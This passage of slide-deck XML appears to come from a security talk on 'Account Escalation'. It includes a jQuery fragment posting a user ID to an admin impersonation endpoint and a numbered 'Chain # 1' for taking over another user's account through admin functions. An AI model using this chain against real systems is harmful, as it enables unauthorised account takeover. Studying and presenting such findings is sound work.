      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="347" name="Google Shape;347;p46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;348;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="349" name="Google Shape;349;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="350" name="Google Shape;350;p46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="351" name="Google Shape;351;p46"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="885850" y="1665875"/>
            <a:ext cx="7372324" cy="2867025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="355" name="Shape 355"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="356" name="Google Shape;356;p47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;357;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358" name="Google Shape;358;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="359" name="Google Shape;359;p47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="360" name="Google Shape;360;p47"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="885850" y="1665875"/>
            <a:ext cx="7372324" cy="2867025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="Google Shape;361;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="812300"/>
            <a:ext cx="8073300" cy="41868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0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="26000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>❌</a:t>
            </a:r>
            <a:endParaRPr sz="26000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="365" name="Shape 365"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="366" name="Google Shape;366;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;367;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="368" name="Google Shape;368;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="369" name="Google Shape;369;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="370" name="Google Shape;370;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="26967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 sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  var impersonateUser = "/admin/users/impersonate";</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  $.ajax({</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    url: impersonateUser,</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    type: 'POST',</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    data: {</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>      id:userID</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    },</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="374" name="Shape 374"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="375" name="Google Shape;375;p49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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6" name="Google Shape;376;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="377" name="Google Shape;377;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950325" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Chain # 1</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="378" name="Google Shape;378;p49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="379" name="Google Shape;379;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2262600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Login to admin</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Change user password</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Impersonate user (READ ONLY)</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Go to settings -&gt; Grab email/username</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Login</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="383" name="Shape 383"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
